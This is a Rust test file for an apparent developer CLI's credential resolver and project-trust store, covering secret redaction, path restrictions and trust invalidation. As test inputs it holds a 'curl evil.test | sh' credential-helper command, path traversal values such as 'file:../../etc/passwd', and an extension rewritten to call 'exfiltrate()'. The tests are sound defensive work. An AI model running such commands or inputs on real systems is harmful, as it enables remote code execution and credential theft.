//! Credentials and project trust, exercised the way the CLI will use them.
//!
//! Both subjects are security boundaries, so these tests are written to fail
//! loudly if the boundary softens: no test may reach the developer's login
//! keychain, no test may touch a real `~/.smith`, and every diagnostic these
//! types can produce is searched for the secret it was handling.
//!
//! The credential service and the environment are injected rather than
//! configured away. That is not only for isolation: a crate that forbids
//! `unsafe` cannot call `std::env::set_var`, so an injected environment is the
//! only way to test a variable that is deliberately absent.

use std::collections::BTreeMap;
use std::path::Path;
use std::sync::{Arc, Mutex};

use agent_runtime_core::error::ErrorKind;
use agent_runtime_core::store::{Secret, SecretStore};
use smith_config::credential::{
    CredentialEnroller, CredentialEnrollmentBackend, CredentialEnrollmentError, CredentialError,
    CredentialRef, CredentialRefError, CredentialResolver, Environment, Keychain, KeychainError,
    ProcessEnvironment, setup_environment_reference, setup_keychain_reference,
};
use smith_config::trust::{
    ContentDigest, Executable, ExecutableKind, TrustDecision, TrustStatus, TrustStore,
};

/// The value every credential test resolves, and the value every diagnostic in
/// this file is checked against.
const SECRET: &str = "sk-live-do-not-print-me";

/// A stand-in for the platform credential service.
#[derive(Debug, Default)]
struct FakeKeychain {
    entries: BTreeMap<(String, String), String>,
    failure: Option<KeychainError>,
}

impl FakeKeychain {
    fn with(service: &str, account: &str, secret: &str) -> Self {
        let mut entries = BTreeMap::new();
        entries.insert((service.to_owned(), account.to_owned()), secret.to_owned());
        Self {
            entries,
            failure: None,
        }
    }

    fn failing(failure: KeychainError) -> Self {
        Self {
            entries: BTreeMap::new(),
            failure: Some(failure),
        }
    }
}

impl Keychain for FakeKeychain {
    fn secret(&self, service: &str, account: &str) -> Result<Secret, KeychainError> {
        if let Some(failure) = &self.failure {
            return Err(failure.clone());
        }
        self.entries
            .get(&(service.to_owned(), account.to_owned()))
            .map(|value| Secret::new(value.clone()))
            .ok_or(KeychainError::Missing)
    }
}

#[derive(Debug, Default)]
struct FakeEnrollmentBackend {
    entries: Mutex<BTreeMap<(String, String), String>>,
    failure: Mutex<Option<KeychainError>>,
}

impl FakeEnrollmentBackend {
    fn with(service: &str, account: &str, secret: &str) -> Self {
        Self {
            entries: Mutex::new(BTreeMap::from([(
                (service.to_owned(), account.to_owned()),
                secret.to_owned(),
            )])),
            failure: Mutex::new(None),
        }
    }

    fn failing(failure: KeychainError) -> Self {
        Self {
            entries: Mutex::new(BTreeMap::new()),
            failure: Mutex::new(Some(failure)),
        }
    }

    fn value(&self, service: &str, account: &str) -> Option<String> {
        self.entries
            .lock()
            .expect("entries")
            .get(&(service.to_owned(), account.to_owned()))
            .cloned()
    }

    fn fail(&self) -> Result<(), KeychainError> {
        match self.failure.lock().expect("failure").clone() {
            Some(error) => Err(error),
            None => Ok(()),
        }
    }
}

impl CredentialEnrollmentBackend for FakeEnrollmentBackend {
    fn prior(&self, service: &str, account: &str) -> Result<Option<Secret>, KeychainError> {
        self.fail()?;
        Ok(self.value(service, account).map(Secret::new))
    }

    fn store(&self, service: &str, account: &str, secret: &Secret) -> Result<(), KeychainError> {
        self.fail()?;
        self.entries.lock().expect("entries").insert(
            (service.to_owned(), account.to_owned()),
            secret.expose().to_owned(),
        );
        Ok(())
    }

    fn remove(&self, service: &str, account: &str) -> Result<(), KeychainError> {
        self.fail()?;
        self.entries
            .lock()
            .expect("entries")
            .remove(&(service.to_owned(), account.to_owned()));
        Ok(())
    }
}

/// A stand-in for the process environment.
#[derive(Debug, Default)]
struct FakeEnvironment(BTreeMap<String, String>);

impl FakeEnvironment {
    fn with(name: &str, value: &str) -> Self {
        Self(BTreeMap::from([(name.to_owned(), value.to_owned())]))
    }
}

impl Environment for FakeEnvironment {
    fn value(&self, name: &str) -> Option<Secret> {
        self.0.get(name).map(|value| Secret::new(value.clone()))
    }
}

/// A resolver whose backends are entirely under this file's control.
fn resolver(
    user_state: &Path,
    keychain: FakeKeychain,
    environment: FakeEnvironment,
) -> CredentialResolver {
    CredentialResolver::new(user_state)
        .with_keychain(Arc::new(keychain))
        .with_environment(Arc::new(environment))
}

fn reference(text: &str) -> CredentialRef {
    CredentialRef::parse(text).expect("a reference")
}

// -- Reference parsing -------------------------------------------------------

#[test]
fn every_reference_form_parses_into_its_backend_and_locator() {
    assert_eq!(
        reference("keychain:smith/acme"),
        CredentialRef::Keychain {
            service: "smith".to_owned(),
            account: "acme".to_owned(),
        }
    );
    assert_eq!(
        reference("env:ACME_API_KEY"),
        CredentialRef::Env {
            variable: "ACME_API_KEY".to_owned(),
        }
    );
    assert_eq!(
        reference("file:credentials/acme.enc"),
        CredentialRef::File {
            path: Path::new("credentials/acme.enc").to_path_buf(),
        }
    );
}

#[test]
fn a_bare_key_is_rejected_rather_than_treated_as_a_credential() {
    assert_eq!(
        CredentialRef::parse(SECRET),
        Err(CredentialRefError::Unprefixed)
    );
    assert_eq!(
        CredentialRef::parse(""),
        Err(CredentialRefError::Unprefixed)
    );
}

#[test]
fn malformed_references_are_rejected_by_form() {
    let rejected = [
        ("vault:smith/acme", CredentialRefError::UnknownScheme),
        ("keychain:smith", CredentialRefError::Keychain),
        ("keychain:/acme", CredentialRefError::Keychain),
        ("keychain:smith/acme/extra", CredentialRefError::Keychain),
        ("env:", CredentialRefError::Env),
        ("env:NOT A NAME", CredentialRefError::Env),
        ("file:", CredentialRefError::File),
        ("file:/etc/passwd", CredentialRefError::File),
        ("file:../../etc/passwd", CredentialRefError::File),
    ];
    for (text, expected) in rejected {
        assert_eq!(CredentialRef::parse(text), Err(expected), "{text}");
    }
}

#[test]
fn rejecting_a_reference_never_repeats_what_was_rejected() {
    // The rejected string may be the secret itself — that is the whole reason
    // it is rejected — and a message that quotes it has published it.
    let pasted = format!("{SECRET}:with-a-colon");
    for text in [SECRET, pasted.as_str(), "sk-proj:abc123"] {
        let err = CredentialRef::parse(text).expect_err("must not parse");
        let message = format!("{err} {err:?}");
        assert!(!message.contains("sk-live"), "{message}");
        assert!(!message.contains("sk-proj"), "{message}");
        assert!(!message.contains("abc123"), "{message}");
    }
}

// -- Resolution --------------------------------------------------------------

#[test]
fn an_environment_reference_resolves_from_the_real_process_environment() {
    // `PATH` is the one variable a test can rely on without setting it, which
    // this crate cannot do anyway. It proves the default backend is wired.
    let expected = std::env::var("PATH").expect("PATH is set");
    let resolved = CredentialResolver::new(std::env::temp_dir())
        .resolve_blocking(&reference("env:PATH"))
        .expect("resolved");
    assert_eq!(resolved.expose(), expected);
    assert!(matches!(
        ProcessEnvironment.value("PATH"),
        Some(value) if value.expose() == expected
    ));
}

#[test]
fn an_environment_reference_resolves_through_the_injected_environment() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::with("ACME_API_KEY", SECRET),
    );

    let resolved = resolver
        .resolve_blocking(&reference("env:ACME_API_KEY"))
        .expect("resolved");
    assert_eq!(resolved.expose(), SECRET);
}

#[test]
fn an_unset_variable_names_the_reference_and_not_the_value() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("env:ACME_API_KEY"))
        .expect_err("nothing is set");
    assert!(matches!(err, CredentialError::Missing { .. }));
    assert!(err.to_string().contains("env:ACME_API_KEY"), "{err}");
}

#[test]
fn a_keychain_reference_resolves_through_the_injected_credential_service() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::with("smith", "acme", SECRET),
        FakeEnvironment::default(),
    );

    let resolved = resolver
        .resolve_blocking(&reference("keychain:smith/acme"))
        .expect("resolved");
    assert_eq!(resolved.expose(), SECRET);
}

// -- Setup enrollment -------------------------------------------------------

#[test]
fn setup_enrollment_uses_the_reviewed_provider_location_and_is_reversible() {
    let backend = Arc::new(FakeEnrollmentBackend::default());
    let enroller = CredentialEnroller::with_backend(backend.clone());
    let reference = setup_keychain_reference("zai").expect("a setup reference");
    assert_eq!(reference.to_string(), "keychain:smith/zai");

    let receipt = enroller
        .enroll(&reference, &Secret::new(SECRET))
        .expect("enrolled");
    assert_eq!(receipt.reference(), &reference);
    assert_eq!(backend.value("smith", "zai").as_deref(), Some(SECRET));
    let debug = format!("{receipt:?} {enroller:?}");
    assert!(!debug.contains(SECRET), "{debug}");

    enroller.restore(receipt).expect("restored absence");
    assert_eq!(backend.value("smith", "zai"), None);
}

#[test]
fn enrollment_restore_puts_back_an_overwritten_value_and_cleanup_is_idempotent() {
    let backend = Arc::new(FakeEnrollmentBackend::with("smith", "zai", "prior-value"));
    let enroller = CredentialEnroller::with_backend(backend.clone());
    let reference = setup_keychain_reference("zai").expect("a setup reference");
    let receipt = enroller
        .enroll(&reference, &Secret::new(SECRET))
        .expect("enrolled");
    assert_eq!(backend.value("smith", "zai").as_deref(), Some(SECRET));
    enroller.restore(receipt).expect("restored prior");
    assert_eq!(
        backend.value("smith", "zai").as_deref(),
        Some("prior-value")
    );

    enroller.cleanup(&reference).expect("cleaned");
    enroller.cleanup(&reference).expect("cleanup remains safe");
    assert_eq!(backend.value("smith", "zai"), None);
}

#[test]
fn environment_setup_records_only_a_reference_and_never_enrolls() {
    let reference = setup_environment_reference("ZAI_API_KEY").expect("an environment reference");
    assert_eq!(reference.to_string(), "env:ZAI_API_KEY");
    let backend = Arc::new(FakeEnrollmentBackend::default());
    let enroller = CredentialEnroller::with_backend(backend);
    assert!(matches!(
        enroller.enroll(&reference, &Secret::new(SECRET)),
        Err(CredentialEnrollmentError::NotStored { .. })
    ));
}

#[test]
fn denied_or_unavailable_enrollment_offers_the_environment_path_without_leaking() {
    for cause in [
        KeychainError::Denied("locked".into()),
        KeychainError::Unavailable("no service".into()),
    ] {
        let enroller =
            CredentialEnroller::with_backend(Arc::new(FakeEnrollmentBackend::failing(cause)));
        let reference = setup_keychain_reference("zai").expect("a setup reference");
        let error = enroller
            .enroll(&reference, &Secret::new(SECRET))
            .expect_err("the backend failed");
        assert!(error.can_use_environment_instead());
        let rendered = format!("{error:?} {error}");
        assert!(!rendered.contains(SECRET), "{rendered}");
        assert!(rendered.contains("keychain:smith/zai"), "{rendered}");
    }
}

#[test]
fn a_missing_keychain_entry_is_absence_rather_than_a_backend_failure() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::with("smith", "other", SECRET),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("keychain:smith/acme"))
        .expect_err("no such entry");
    assert!(matches!(err, CredentialError::Missing { .. }));
    assert!(err.to_string().contains("keychain:smith/acme"), "{err}");
}

#[test]
fn a_refused_credential_service_says_which_reference_and_why() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::failing(KeychainError::Denied("the keychain is locked".to_owned())),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("keychain:smith/acme"))
        .expect_err("access refused");
    assert!(matches!(err, CredentialError::Backend { .. }));
    let message = err.to_string();
    assert!(message.contains("keychain:smith/acme"), "{message}");
    assert!(message.contains("the keychain is locked"), "{message}");
}

#[test]
fn an_unavailable_credential_service_is_distinguishable_from_a_missing_entry() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::failing(KeychainError::Unavailable("no D-Bus session".to_owned())),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("keychain:smith/acme"))
        .expect_err("no service");
    assert!(matches!(
        err,
        CredentialError::Backend {
            cause: KeychainError::Unavailable(_),
            ..
        }
    ));
}

// -- The encrypted-file fallback --------------------------------------------

/// Writes a ciphertext placeholder at `relative` inside `root`.
fn ciphertext(root: &Path, relative: &str, mode: u32) -> std::path::PathBuf {
    let path = root.join(relative);
    std::fs::create_dir_all(path.parent().expect("a parent")).expect("the directory");
    std::fs::write(&path, b"ciphertext").expect("the file");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(mode))
            .expect("the permissions");
    }
    #[cfg(not(unix))]
    let _ = mode;
    path
}

#[test]
fn an_encrypted_file_reports_the_absent_cipher_and_what_to_use_instead() {
    let root = tempfile::tempdir().expect("a temp dir");
    ciphertext(root.path(), "credentials/acme.enc", 0o600);
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("file:credentials/acme.enc"))
        .expect_err("there is no cipher yet");
    assert!(matches!(err, CredentialError::Unavailable { .. }));
    let message = err.to_string();
    assert!(message.contains("file:credentials/acme.enc"), "{message}");
    assert!(message.contains("keychain:"), "{message}");
}

#[test]
fn a_missing_ciphertext_file_is_reported_before_the_cipher_is() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("file:credentials/acme.enc"))
        .expect_err("nothing is stored");
    assert!(matches!(err, CredentialError::Missing { .. }));
}

#[cfg(unix)]
#[test]
fn a_ciphertext_readable_by_other_users_is_refused() {
    let root = tempfile::tempdir().expect("a temp dir");
    ciphertext(root.path(), "credentials/acme.enc", 0o644);
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("file:credentials/acme.enc"))
        .expect_err("world-readable credential material");
    assert!(matches!(err, CredentialError::Exposed { .. }), "{err}");
}

#[test]
fn an_absolute_file_reference_is_refused_even_when_it_bypasses_parsing() {
    // Parsing rejects `file:/etc/passwd`, but the variant's fields are public,
    // so the resolver must not rely on that.
    let root = tempfile::tempdir().expect("a temp dir");
    let elsewhere = tempfile::tempdir().expect("a second temp dir");
    ciphertext(elsewhere.path(), "acme.enc", 0o600);
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&CredentialRef::File {
            path: elsewhere.path().join("acme.enc"),
        })
        .expect_err("outside user state");
    assert!(
        matches!(err, CredentialError::OutsideUserState { .. }),
        "{err}"
    );
}

#[cfg(unix)]
#[test]
fn a_symlink_out_of_user_state_is_refused() {
    let root = tempfile::tempdir().expect("a temp dir");
    let elsewhere = tempfile::tempdir().expect("a second temp dir");
    let target = ciphertext(elsewhere.path(), "acme.enc", 0o600);
    std::fs::create_dir_all(root.path().join("credentials")).expect("the directory");
    std::os::unix::fs::symlink(&target, root.path().join("credentials/acme.enc"))
        .expect("the symlink");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver
        .resolve_blocking(&reference("file:credentials/acme.enc"))
        .expect_err("the link leaves user state");
    assert!(
        matches!(err, CredentialError::OutsideUserState { .. }),
        "{err}"
    );
}

// -- Redaction ---------------------------------------------------------------

#[test]
fn no_public_type_can_print_a_resolved_secret() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::with("smith", "acme", SECRET),
        FakeEnvironment::with("ACME_API_KEY", SECRET),
    );
    let keychain = reference("keychain:smith/acme");
    let secret = resolver.resolve_blocking(&keychain).expect("resolved");

    let mut rendered = vec![
        format!("{secret:?}"),
        format!("{secret}"),
        format!("{resolver:?}"),
        format!("{keychain:?}"),
        format!("{keychain}"),
    ];
    for text in ["env:MISSING", "keychain:smith/missing", "file:acme.enc"] {
        let err = resolver
            .resolve_blocking(&reference(text))
            .expect_err("nothing resolves");
        rendered.push(format!("{err:?}"));
        rendered.push(format!("{err}"));
    }
    let err = CredentialRef::parse(SECRET).expect_err("a bare key");
    rendered.push(format!("{err:?}"));
    rendered.push(format!("{err}"));

    for text in rendered {
        assert!(!text.contains(SECRET), "a secret leaked into: {text}");
        assert!(!text.contains("sk-live"), "a secret leaked into: {text}");
    }
    // The value is still reachable where it is actually needed.
    assert_eq!(secret.expose(), SECRET);
}

#[test]
fn a_trust_record_of_a_shell_setting_never_carries_its_command() {
    let command = format!("echo {SECRET}");
    let setting = Executable::from_setting("providers.acme.credential_helper", &command);
    let rendered = format!("{setting:?} {:?}", setting.digest());
    assert!(!rendered.contains(SECRET), "{rendered}");
    assert_eq!(setting.digest().as_hex().len(), 64);
}

// -- The SecretStore contract ------------------------------------------------

#[tokio::test]
async fn the_secret_store_resolves_a_configured_reference() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::with("smith", "acme", SECRET),
        FakeEnvironment::default(),
    );

    let resolved = resolver
        .resolve("keychain:smith/acme")
        .await
        .expect("no failure")
        .expect("a secret");
    assert_eq!(resolved.expose(), SECRET);
}

#[tokio::test]
async fn the_secret_store_reports_an_absent_entry_as_absence() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    assert!(
        resolver
            .resolve("keychain:smith/acme")
            .await
            .expect("absence is not a failure")
            .is_none()
    );
}

#[tokio::test]
async fn the_secret_store_refuses_a_plaintext_key_without_echoing_it() {
    let root = tempfile::tempdir().expect("a temp dir");
    let resolver = resolver(
        root.path(),
        FakeKeychain::default(),
        FakeEnvironment::default(),
    );

    let err = resolver.resolve(SECRET).await.expect_err("not a reference");
    assert_eq!(err.kind, ErrorKind::Config);
    assert!(!format!("{err:?} {err}").contains("sk-live"), "{err}");
}

// -- Project trust -----------------------------------------------------------

/// A project with one extension, and a store rooted outside any real home.
fn project() -> (tempfile::TempDir, tempfile::TempDir, TrustStore) {
    let project = tempfile::tempdir().expect("a project");
    std::fs::create_dir_all(project.path().join(".smith/extensions")).expect("the directory");
    std::fs::write(
        project.path().join(".smith/extensions/review.ts"),
        "export const run = () => {};\n",
    )
    .expect("the extension");

    let state = tempfile::tempdir().expect("a state root");
    let store = TrustStore::open(state.path()).expect("an empty store");
    (project, state, store)
}

fn extension(project: &Path) -> Executable {
    Executable::from_file(
        project,
        ExecutableKind::Extension,
        &project.join(".smith/extensions/review.ts"),
    )
    .expect("an extension")
}

#[test]
fn a_store_writes_only_under_the_root_it_was_given() {
    let (project, state, mut store) = project();
    assert!(store.path().starts_with(state.path()));
    assert!(!store.path().exists(), "opening must not write");

    store
        .record(
            project.path(),
            &extension(project.path()),
            TrustDecision::Allow,
        )
        .expect("recorded");
    assert!(store.path().starts_with(state.path()));
    assert!(store.path().exists());
}

#[test]
fn an_unrecorded_extension_is_untrusted() {
    let (project, _state, store) = project();
    assert_eq!(
        store
            .status(project.path(), &extension(project.path()))
            .expect("a status"),
        TrustStatus::Untrusted
    );
}

#[test]
fn a_recorded_decision_is_honored_for_the_same_content() {
    let (project, _state, mut store) = project();
    let artifact = extension(project.path());

    store
        .record(project.path(), &artifact, TrustDecision::Allow)
        .expect("recorded");

    let status = store.status(project.path(), &artifact).expect("a status");
    assert_eq!(status, TrustStatus::Trusted);
    assert!(status.allows_execution());
}

#[test]
fn changed_content_invalidates_the_decision_and_forces_a_new_answer() {
    let (project, _state, mut store) = project();
    store
        .record(
            project.path(),
            &extension(project.path()),
            TrustDecision::Allow,
        )
        .expect("recorded");

    std::fs::write(
        project.path().join(".smith/extensions/review.ts"),
        "export const run = () => { exfiltrate(); };\n",
    )
    .expect("the rewritten extension");

    let status = store
        .status(project.path(), &extension(project.path()))
        .expect("a status");
    assert_eq!(status, TrustStatus::Changed);
    assert!(!status.allows_execution());
}

#[test]
fn a_refusal_is_remembered_and_never_reads_as_trust() {
    let (project, _state, mut store) = project();
    let artifact = extension(project.path());

    store
        .record(project.path(), &artifact, TrustDecision::Deny)
        .expect("recorded");

    let status = store.status(project.path(), &artifact).expect("a status");
    assert_eq!(status, TrustStatus::Denied);
    assert!(!status.allows_execution());
}

#[test]
fn a_later_decision_replaces_the_earlier_one_for_the_same_artifact() {
    let (project, _state, mut store) = project();
    let artifact = extension(project.path());

    store
        .record(project.path(), &artifact, TrustDecision::Deny)
        .expect("recorded");
    store
        .record(project.path(), &artifact, TrustDecision::Allow)
        .expect("recorded again");

    assert_eq!(store.records(project.path()).expect("records").len(), 1);
    assert_eq!(
        store.status(project.path(), &artifact).expect("a status"),
        TrustStatus::Trusted
    );
}

#[test]
fn decisions_survive_reopening_the_store() {
    let (project, state, mut store) = project();
    let artifact = extension(project.path());
    store
        .record(project.path(), &artifact, TrustDecision::Allow)
        .expect("recorded");

    let reopened = TrustStore::open(state.path()).expect("the persisted store");
    assert_eq!(
        reopened
            .status(project.path(), &artifact)
            .expect("a status"),
        TrustStatus::Trusted
    );
    let records = reopened.records(project.path()).expect("records");
    assert_eq!(records.len(), 1);
    assert_eq!(records[0].kind, ExecutableKind::Extension);
    assert_eq!(records[0].label, ".smith/extensions/review.ts");
}

#[test]
fn trust_is_bound_to_the_project_it_was_given_in() {
    let (project, _state, mut store) = project();
    let artifact = extension(project.path());
    store
        .record(project.path(), &artifact, TrustDecision::Allow)
        .expect("recorded");

    // The same artifact identity, claimed by a different checkout.
    let elsewhere = tempfile::tempdir().expect("another project");
    assert_eq!(
        store.status(elsewhere.path(), &artifact).expect("a status"),
        TrustStatus::Untrusted
    );
}

#[test]
fn forgetting_a_project_makes_smith_ask_again() {
    let (project, _state, mut store) = project();
    let artifact = extension(project.path());
    store
        .record(project.path(), &artifact, TrustDecision::Allow)
        .expect("recorded");

    store.forget(project.path()).expect("forgotten");
    assert_eq!(
        store.status(project.path(), &artifact).expect("a status"),
        TrustStatus::Untrusted
    );
    assert!(store.records(project.path()).expect("records").is_empty());
}

#[test]
fn a_file_outside_the_project_cannot_become_part_of_it() {
    let (project, _state, _store) = project();
    let elsewhere = tempfile::tempdir().expect("somewhere else");
    let script = elsewhere.path().join("payload.sh");
    std::fs::write(&script, "#!/bin/sh\n").expect("the script");

    let err = Executable::from_file(project.path(), ExecutableKind::Hook, &script)
        .expect_err("outside the project");
    assert_eq!(err.kind, ErrorKind::Workspace);
}

#[cfg(unix)]
#[test]
fn a_symlink_out_of_the_project_cannot_inherit_its_trust() {
    let (project, _state, _store) = project();
    let elsewhere = tempfile::tempdir().expect("somewhere else");
    let script = elsewhere.path().join("payload.sh");
    std::fs::write(&script, "#!/bin/sh\n").expect("the script");
    let link = project.path().join(".smith/hooks.sh");
    std::os::unix::fs::symlink(&script, &link).expect("the symlink");

    let err = Executable::from_file(project.path(), ExecutableKind::Hook, &link)
        .expect_err("the link leaves the project");
    assert_eq!(err.kind, ErrorKind::Workspace);
}

#[test]
fn a_shell_setting_is_trusted_by_its_text_and_invalidated_by_a_change() {
    let (project, _state, mut store) = project();
    let setting = Executable::from_setting("providers.acme.credential_helper", "acme-auth print");
    store
        .record(project.path(), &setting, TrustDecision::Allow)
        .expect("recorded");
    assert_eq!(
        store.status(project.path(), &setting).expect("a status"),
        TrustStatus::Trusted
    );

    let rewritten =
        Executable::from_setting("providers.acme.credential_helper", "curl evil.test | sh");
    assert_eq!(
        store.status(project.path(), &rewritten).expect("a status"),
        TrustStatus::Changed
    );
}

#[test]
fn an_extension_and_its_manifest_are_approved_and_invalidated_together() {
    let (project, _state, mut store) = project();
    let bundle = |manifest: &str| {
        Executable::new(
            ExecutableKind::Extension,
            ".smith/extensions/review",
            ContentDigest::of_parts([
                b"export const run = () => {};".as_slice(),
                manifest.as_bytes(),
            ]),
        )
    };

    store
        .record(
            project.path(),
            &bundle("capabilities = []"),
            TrustDecision::Allow,
        )
        .expect("recorded");

    assert_eq!(
        store
            .status(project.path(), &bundle("capabilities = [\"shell\"]"))
            .expect("a status"),
        TrustStatus::Changed
    );
}

#[test]
fn an_unreadable_trust_file_is_reported_rather_than_treated_as_a_fresh_machine() {
    let state = tempfile::tempdir().expect("a state root");
    std::fs::write(state.path().join("trust.json"), b"{ not json").expect("a corrupt file");

    let err = TrustStore::open(state.path()).expect_err("corrupt");
    assert_eq!(err.kind, ErrorKind::Config);
    assert!(err.message.contains("trust.json"), "{err}");
}

#[test]
fn a_project_that_cannot_be_resolved_is_an_error_rather_than_a_guess() {
    let (_project, _state, store) = project();
    let missing = Path::new("/definitely/not/a/real/project");
    let err = store
        .status(missing, &Executable::from_setting("hooks.pre_tool", "true"))
        .expect_err("no such project");
    assert_eq!(err.kind, ErrorKind::Config);
}
